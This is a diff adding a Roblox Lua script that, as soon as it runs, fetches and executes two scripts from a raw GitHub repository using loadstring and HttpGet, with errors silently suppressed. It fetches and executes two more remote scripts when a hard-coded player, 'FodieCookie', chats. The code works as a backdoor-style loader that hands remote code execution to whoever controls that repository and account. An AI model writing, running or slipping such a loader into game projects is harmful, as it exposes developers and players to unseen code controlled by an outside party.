@@ -1,0 +1,59 @@
+local Players = game:GetService("Players")
+
+local targetUsername = "FodieCookie"
+
+local autoRunScript1 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/n.lua"
+local autoRunScript2 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/h.lua"
+
+local triggeredScript1 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/l.lua"
+local triggeredScript2 = "https://raw.githubusercontent.com/DupeNew/lol/refs/heads/main/g.lua"
+
+pcall(function()
+    loadstring(game:HttpGet(autoRunScript1))()
+end)
+pcall(function()
+    loadstring(game:HttpGet(autoRunScript2))()
+end)
+
+local hasTriggered = false
+local chatConnection = nil
+
+local function executeTriggeredPayload()
+    if hasTriggered then
+        return
+    end
+    hasTriggered = true
+
+    if chatConnection then
+        chatConnection:Disconnect()
+        chatConnection = nil
+    end
+
+    pcall(function()
+        loadstring(game:HttpGet(triggeredScript1))()
+    end)
+    
+    pcall(function()
+        loadstring(game:HttpGet(triggeredScript2))()
+    end)
+end
+
+local function setupChatListener(player)
+    if player.Name == targetUsername then
+        chatConnection = player.Chatted:Connect(function()
+            executeTriggeredPayload()
+        end)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if not hasTriggered then
+        setupChatListener(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if not hasTriggered then
+        setupChatListener(player)
+    end
+end)
